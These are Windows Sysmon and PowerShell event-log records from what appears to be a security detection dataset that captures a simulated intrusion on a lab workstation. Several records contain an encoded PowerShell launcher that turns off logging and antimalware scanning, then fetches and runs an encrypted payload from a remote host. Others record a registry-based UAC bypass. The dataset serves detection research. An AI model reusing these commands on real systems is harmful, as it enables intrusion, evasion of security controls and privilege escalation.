{"Version":3,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:13.229\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nImageLoaded: C:\\Windows\\System32\\sppc.dll\r\nFileVersion: 10.0.18362.815 (WinBuild.160101.0800)\r\nDescription: Software Licensing Client Dll\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: sppc.dll\r\nHashes: SHA1=92F05DAD4B534A6702DD86D00782972D98C8C16C,MD5=05E839DB5511AB6D83DF753BE40C4F02,SHA256=6C5372D5D20C7A76E1A975A15118ADCE36E48683C762AC015A41CAE5A2AF79A0,IMPHASH=2560F722BC4411B590E8E87B2589E955\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid","Product":"Microsoft® Windows® Operating System","Domain":"NT AUTHORITY","ImageLoaded":"C:\\Windows\\System32\\sppc.dll","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SignatureStatus":"Valid","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":7,"FileVersion":"10.0.18362.815 (WinBuild.160101.0800)","ProcessId":"1376","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Description":"Software Licensing Client Dll","Hashes":"SHA1=92F05DAD4B534A6702DD86D00782972D98C8C16C,MD5=05E839DB5511AB6D83DF753BE40C4F02,SHA256=6C5372D5D20C7A76E1A975A15118ADCE36E48683C762AC015A41CAE5A2AF79A0,IMPHASH=2560F722BC4411B590E8E87B2589E955","Channel":"Microsoft-Windows-Sysmon/Operational","Signature":"Microsoft Windows","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","AccountType":"User","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","Company":"Microsoft Corporation","ThreadID":4344,"RecordNumber":309686,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OriginalFileName":"sppc.dll","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Image loaded (rule: ImageLoad)","EventReceivedTime":"2020-09-04 03:30:13","Task":7,"UtcTime":"2020-09-04 07:30:13.229","EventTime":"2020-09-04 03:30:13","@timestamp":"2020-09-04T07:30:13.839Z","tags":["mordorDataset"],"RuleName":"-","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Signed":"true"}
{"Version":1,"AccountType":"User","Domain":"THESHIRE","ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = e0c721de-e388-4e12-b87b-cd7d6e01790c\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 0cdca6a7-e64c-4b73-be25-b18db6018f6b\r\n        Pipeline ID = 1\r\n        Command Name = New-ItemProperty\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 3124\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Opcode":"To be used when operation is just executing a method","UserID":"S-1-5-21-3125456671-949036322-3048627137-1104","SourceName":"Microsoft-Windows-PowerShell","Hostname":"WORKSTATION5.theshire.local","ActivityID":"{245D3B9B-5E92-0001-A32A-D7128A82D601}","EventType":"INFO","ThreadID":7596,"RecordNumber":3594,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":0,"Severity":"INFO","OpcodeValue":20,"AccountName":"pgustavo","host":"wec.internal.cloudapp.net","EventID":4103,"ERROR_EVT_UNRESOLVED":true,"port":53971,"@version":"1","Category":"Executing Pipeline","EventReceivedTime":"2020-09-04 03:30:13","Task":106,"Payload":"CommandInvocation(New-ItemProperty): \"New-ItemProperty\"\r\nParameterBinding(New-ItemProperty): name=\"Path\"; value=\"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\"\r\nParameterBinding(New-ItemProperty): name=\"Name\"; value=\"DelegateExecute\"\r\nParameterBinding(New-ItemProperty): name=\"Value\"; value=\"\"\r\nParameterBinding(New-ItemProperty): name=\"Force\"; value=\"True\"\r\nCommandInvocation(Out-Null): \"Out-Null\"\r\nParameterBinding(Out-Null): name=\"InputObject\"; value=\"@{DelegateExecute=; PSPath=Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command; PSParentPath=Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open; PSChildName=command; PSDrive=HKCU; PSProvider=Microsoft.PowerShell.Core\\Registry}\"\r\n","EventTime":"2020-09-04 03:30:13","Channel":"Microsoft-Windows-PowerShell/Operational","@timestamp":"2020-09-04T07:30:13.841Z","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":1376,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"]}
{"Version":3,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:13.229\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nImageLoaded: C:\\Windows\\System32\\OneCoreCommonProxyStub.dll\r\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\r\nDescription: OneCore Common Proxy Stub\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: OneCoreCommonProxyStub.dll\r\nHashes: SHA1=A41B65A11638C58B99039B5099D4229E33761541,MD5=7EBFDCF78039F8A62E76687F29973FDE,SHA256=DC80D03DBCBB7D276E6D14EC19EAF6A31C6BE4EEFE8562FDF086BF73DF3BE5F6,IMPHASH=E20DAD2DC874B17CCC1F3ED8FB387E79\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid","Product":"Microsoft® Windows® Operating System","Domain":"NT AUTHORITY","ImageLoaded":"C:\\Windows\\System32\\OneCoreCommonProxyStub.dll","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SignatureStatus":"Valid","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":7,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","ProcessId":"1376","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Description":"OneCore Common Proxy Stub","Hashes":"SHA1=A41B65A11638C58B99039B5099D4229E33761541,MD5=7EBFDCF78039F8A62E76687F29973FDE,SHA256=DC80D03DBCBB7D276E6D14EC19EAF6A31C6BE4EEFE8562FDF086BF73DF3BE5F6,IMPHASH=E20DAD2DC874B17CCC1F3ED8FB387E79","Channel":"Microsoft-Windows-Sysmon/Operational","Signature":"Microsoft Windows","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","AccountType":"User","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","Company":"Microsoft Corporation","ThreadID":4344,"RecordNumber":309687,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OriginalFileName":"OneCoreCommonProxyStub.dll","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Image loaded (rule: ImageLoad)","EventReceivedTime":"2020-09-04 03:30:13","Task":7,"UtcTime":"2020-09-04 07:30:13.229","EventTime":"2020-09-04 03:30:13","@timestamp":"2020-09-04T07:30:13.841Z","tags":["mordorDataset"],"RuleName":"-","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Signed":"true"}
{"Version":1,"AccountType":"User","Domain":"THESHIRE","ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = e0c721de-e388-4e12-b87b-cd7d6e01790c\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 0cdca6a7-e64c-4b73-be25-b18db6018f6b\r\n        Pipeline ID = 1\r\n        Command Name = Set-ItemProperty\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 3126\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Opcode":"To be used when operation is just executing a method","UserID":"S-1-5-21-3125456671-949036322-3048627137-1104","SourceName":"Microsoft-Windows-PowerShell","Hostname":"WORKSTATION5.theshire.local","ActivityID":"{245D3B9B-5E92-0001-A52A-D7128A82D601}","EventType":"INFO","ThreadID":7596,"RecordNumber":3595,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":0,"Severity":"INFO","OpcodeValue":20,"AccountName":"pgustavo","host":"wec.internal.cloudapp.net","EventID":4103,"ERROR_EVT_UNRESOLVED":true,"port":53971,"@version":"1","Category":"Executing Pipeline","EventReceivedTime":"2020-09-04 03:30:13","Task":106,"Payload":"CommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\r\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\"\r\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"(default)\"\r\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x\"\r\nParameterBinding(Set-ItemProperty): name=\"Force\"; value=\"True\"\r\nCommandInvocation(Out-Null): \"Out-Null\"\r\n","EventTime":"2020-09-04 03:30:13","Channel":"Microsoft-Windows-PowerShell/Operational","@timestamp":"2020-09-04T07:30:13.842Z","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":1376,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"]}
